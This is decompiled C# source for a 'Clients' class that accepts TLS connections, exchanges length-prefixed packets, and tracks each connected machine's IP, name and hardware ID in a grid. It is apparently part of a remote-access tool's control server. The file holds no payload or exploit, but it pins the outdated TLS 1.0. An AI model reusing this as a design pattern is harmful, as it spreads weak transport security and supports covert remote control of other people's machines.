using System;
using System.Drawing;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Windows.Forms;
using Leb128;
using Server.Connectings.Events;
using Server.Data;
using Server.Helper;
using Server.Messages;

namespace Server.Connectings
{
	// Token: 0x020000CA RID: 202
	public class Clients
	{
		// Token: 0x17000066 RID: 102
		// (get) Token: 0x06000664 RID: 1636 RVA: 0x0005BE04 File Offset: 0x0005A004
		// (set) Token: 0x06000665 RID: 1637 RVA: 0x0005BE0C File Offset: 0x0005A00C
		private byte[] ClientBuffer { get; set; }

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x06000666 RID: 1638 RVA: 0x0005BE15 File Offset: 0x0005A015
		// (set) Token: 0x06000667 RID: 1639 RVA: 0x0005BE1D File Offset: 0x0005A01D
		private int HeaderSize { get; set; }

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x06000668 RID: 1640 RVA: 0x0005BE26 File Offset: 0x0005A026
		// (set) Token: 0x06000669 RID: 1641 RVA: 0x0005BE2E File Offset: 0x0005A02E
		private int Offset { get; set; }

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x0600066A RID: 1642 RVA: 0x0005BE37 File Offset: 0x0005A037
		// (set) Token: 0x0600066B RID: 1643 RVA: 0x0005BE3F File Offset: 0x0005A03F
		private bool ClientBufferRecevied { get; set; }

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x0600066C RID: 1644 RVA: 0x0005BE48 File Offset: 0x0005A048
		// (set) Token: 0x0600066D RID: 1645 RVA: 0x0005BE50 File Offset: 0x0005A050
		private object SendSync { get; set; }

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x0600066E RID: 1646 RVA: 0x0005BE59 File Offset: 0x0005A059
		// (set) Token: 0x0600066F RID: 1647 RVA: 0x0005BE61 File Offset: 0x0005A061
		private SslStream SslClient { get; set; }

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x06000670 RID: 1648 RVA: 0x0005BE6A File Offset: 0x0005A06A
		// (set) Token: 0x06000671 RID: 1649 RVA: 0x0005BE72 File Offset: 0x0005A072
		public LastPing lastPing { get; set; }

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x06000672 RID: 1650 RVA: 0x0005BE7B File Offset: 0x0005A07B
		// (set) Token: 0x06000673 RID: 1651 RVA: 0x0005BE83 File Offset: 0x0005A083
		public Socket Tcp { get; private set; }

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x06000674 RID: 1652 RVA: 0x0005BE8C File Offset: 0x0005A08C
		// (set) Token: 0x06000675 RID: 1653 RVA: 0x0005BE94 File Offset: 0x0005A094
		public string IP { get; private set; }

		// Token: 0x1700006F RID: 111
		// (get) Token: 0x06000676 RID: 1654 RVA: 0x0005BE9D File Offset: 0x0005A09D
		// (set) Token: 0x06000677 RID: 1655 RVA: 0x0005BEA5 File Offset: 0x0005A0A5
		public bool itsConnect { get; private set; }

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x06000678 RID: 1656 RVA: 0x0005BEAE File Offset: 0x0005A0AE
		// (set) Token: 0x06000679 RID: 1657 RVA: 0x0005BEB6 File Offset: 0x0005A0B6
		public bool Auth { get; private set; }

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x0600067A RID: 1658 RVA: 0x0005BEBF File Offset: 0x0005A0BF
		// (set) Token: 0x0600067B RID: 1659 RVA: 0x0005BEC7 File Offset: 0x0005A0C7
		public string Hwid { get; set; }

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x0600067C RID: 1660 RVA: 0x0005BED0 File Offset: 0x0005A0D0
		// (set) Token: 0x0600067D RID: 1661 RVA: 0x0005BED8 File Offset: 0x0005A0D8
		public string UserMachine { get; set; }

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x0600067E RID: 1662 RVA: 0x0005BEE1 File Offset: 0x0005A0E1
		// (set) Token: 0x0600067F RID: 1663 RVA: 0x0005BEE9 File Offset: 0x0005A0E9
		public object Tag { get; set; }

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x06000680 RID: 1664 RVA: 0x0005BEF2 File Offset: 0x0005A0F2
		// (set) Token: 0x06000681 RID: 1665 RVA: 0x0005BEFA File Offset: 0x0005A0FA
		public Clients ReportWindow { get; set; }

		// Token: 0x14000011 RID: 17
		// (add) Token: 0x06000682 RID: 1666 RVA: 0x0005BF04 File Offset: 0x0005A104
		// (remove) Token: 0x06000683 RID: 1667 RVA: 0x0005BF3C File Offset: 0x0005A13C
		public event EventHandler<EventDisconnect> eventDisconnect;

		// Token: 0x06000684 RID: 1668 RVA: 0x0005BF74 File Offset: 0x0005A174
		public Clients(Socket Tcp)
		{
			this.itsConnect = true;
			this.Tcp = Tcp;
			this.SslClient = new SslStream(new NetworkStream(Tcp, true), false);
			this.SslClient.BeginAuthenticateAsServer(Certificate.certificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), null);
			this.IP = this.Tcp.RemoteEndPoint.ToString().Split(new char[]
			{
				':'
			})[0];
			this.SendSync = new object();
			this.lastPing = new LastPing(this);
		}

		// Token: 0x06000685 RID: 1669 RVA: 0x0005C00C File Offset: 0x0005A20C
		private void EndAuthenticate(IAsyncResult ar)
		{
			try
			{
				this.SslClient.EndAuthenticateAsServer(ar);
				this.Offset = 0;
				this.HeaderSize = 4;
				this.ClientBuffer = new byte[this.HeaderSize];
				this.Auth = true;
				SocketData.ConnectsPluse();
				this.SslClient.BeginRead(this.ClientBuffer, this.Offset, this.HeaderSize, new AsyncCallback(this.ReadData), null);
			}
			catch (Exception)
			{
				this.Disconnect();
			}
		}

		// Token: 0x06000686 RID: 1670 RVA: 0x0005C098 File Offset: 0x0005A298
		public void Disconnect()
		{
			if (!this.itsConnect)
			{
				return;
			}
			if (this.Auth)
			{
				SocketData.ConnectsMinuse();
			}
			if (this.eventDisconnect != null)
			{
				this.eventDisconnect(this, new EventDisconnect
				{
					clients = this
				});
			}
			this.itsConnect = false;
			this.ClientBuffer = null;
			this.HeaderSize = 0;
			this.Offset = 0;
			Socket tcp = this.Tcp;
			if (tcp != null)
			{
				tcp.Dispose();
			}
			SslStream sslClient = this.SslClient;
			if (sslClient != null)
			{
				sslClient.Dispose();
			}
			LastPing lastPing = this.lastPing;
			if (lastPing != null)
			{
				lastPing.Disconnect();
			}
			if (this.Tag != null && this.Tag is DataGridViewRow)
			{
				DataGridViewRow row = (DataGridViewRow)this.Tag;
				DataGridView datagrid = row.DataGridView;
				if (row.Cells.Count > 12)
				{
					Methods.AppendLogs(string.Concat(new string[]
					{
						"Client ",
						this.IP,
						" ",
						this.UserMachine,
						" ",
						this.Hwid
					}), "Disconnect", Color.Red);
				}
				if (datagrid != null)
				{
					datagrid.Invoke(new MethodInvoker(delegate()
					{
						datagrid.Rows.Remove(row);
					}));
				}
				row.Dispose();
			}
			if (this.ReportWindow != null)
			{
				this.ReportWindow.Disconnect();
			}
		}

		// Token: 0x06000687 RID: 1671 RVA: 0x0005C20C File Offset: 0x0005A40C
		private void ReadData(IAsyncResult ar)
		{
			if (!this.itsConnect)
			{
				return;
			}
			try
			{
				int num = this.SslClient.EndRead(ar);
				if (num > 0)
				{
					if (this.Recevied != null)
					{
						this.Recevied((long)num);
					}
					SocketData.ReciveData((long)num);
					this.HeaderSize -= num;
					this.Offset += num;
					if (this.lastPing != null)
					{
						this.lastPing.Last();
					}
					if (!this.ClientBufferRecevied)
					{
						if (this.HeaderSize == 0)
						{
							this.HeaderSize = BitConverter.ToInt32(this.ClientBuffer, 0);
							if (this.HeaderSize > 0)
							{
								this.ClientBuffer = new byte[this.HeaderSize];
								this.Offset = 0;
								this.ClientBufferRecevied = true;
							}
						}
						else if (this.HeaderSize < 0)
						{
							this.Disconnect();
							return;
						}
					}
					else if (this.HeaderSize == 0)
					{
						new Packet().Read(this, this.ClientBuffer);
						this.Offset = 0;
						this.HeaderSize = 4;
						this.ClientBuffer = new byte[this.HeaderSize];
						this.ClientBufferRecevied = false;
					}
					else if (this.HeaderSize < 0)
					{
						this.Disconnect();
						return;
					}
					this.SslClient.BeginRead(this.ClientBuffer, this.Offset, this.HeaderSize, new AsyncCallback(this.ReadData), null);
				}
				else
				{
					this.Disconnect();
				}
			}
			catch (Exception)
			{
				this.Disconnect();
			}
		}

		// Token: 0x06000688 RID: 1672 RVA: 0x0005C394 File Offset: 0x0005A594
		public void Send(object[] Data)
		{
			this.Send(LEB128.Write(Data));
		}

		// Token: 0x06000689 RID: 1673 RVA: 0x0005C3A4 File Offset: 0x0005A5A4
		public void Send(byte[] Data)
		{
			if (!this.itsConnect)
			{
				return;
			}
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					byte[] bytes = BitConverter.GetBytes(Data.Length);
					byte[] array = new byte[4 + Data.Length];
					Array.Copy(bytes, 0, array, 0, bytes.Length);
					Array.Copy(Data, 0, array, 4, Data.Length);
					this.Tcp.Poll(-1, SelectMode.SelectWrite);
					this.SslClient.Write(array, 0, array.Length);
					this.SslClient.Flush();
					if (this.Sents != null)
					{
						this.Sents((long)array.Length);
					}
					SocketData.SentData((long)array.Length);
				}
				catch (Exception)
				{
					this.Disconnect();
				}
			}
		}

		// Token: 0x0600068A RID: 1674 RVA: 0x0005C474 File Offset: 0x0005A674
		public void SendChunk(object[] Data)
		{
			this.Send(LEB128.Write(Data));
		}

		// Token: 0x0600068B RID: 1675 RVA: 0x0005C484 File Offset: 0x0005A684
		public void SendChunk(byte[] Data)
		{
			if (!this.itsConnect)
			{
				return;
			}
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					if (Data.Length < 16384)
					{
						this.Send(Data);
					}
					else
					{
						byte[] bytes = BitConverter.GetBytes(Data.Length);
						byte[] array = new byte[4 + Data.Length];
						Array.Copy(bytes, 0, array, 0, bytes.Length);
						Array.Copy(Data, 0, array, 4, Data.Length);
						using (MemoryStream memoryStream = new MemoryStream(array))
						{
							memoryStream.Position = 0L;
							byte[] array2 = new byte[16384];
							int num;
							while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
							{
								this.Tcp.Poll(-1, SelectMode.SelectWrite);
								this.SslClient.Write(array2, 0, num);
								this.SslClient.Flush();
								if (this.Sents != null)
								{
									this.Sents((long)num);
								}
							}
						}
					}
				}
				catch (Exception)
				{
					this.Disconnect();
				}
			}
		}

		// Token: 0x0400058C RID: 1420
		public Clients.Delegate Sents;

		// Token: 0x0400058D RID: 1421
		public Clients.Delegate Recevied;

		// Token: 0x02000255 RID: 597
		// (Invoke) Token: 0x06000968 RID: 2408
		public delegate void Delegate1();

		// Token: 0x02000256 RID: 598
		// (Invoke) Token: 0x0600096C RID: 2412
		public delegate void Delegate(long bytes);
	}
}
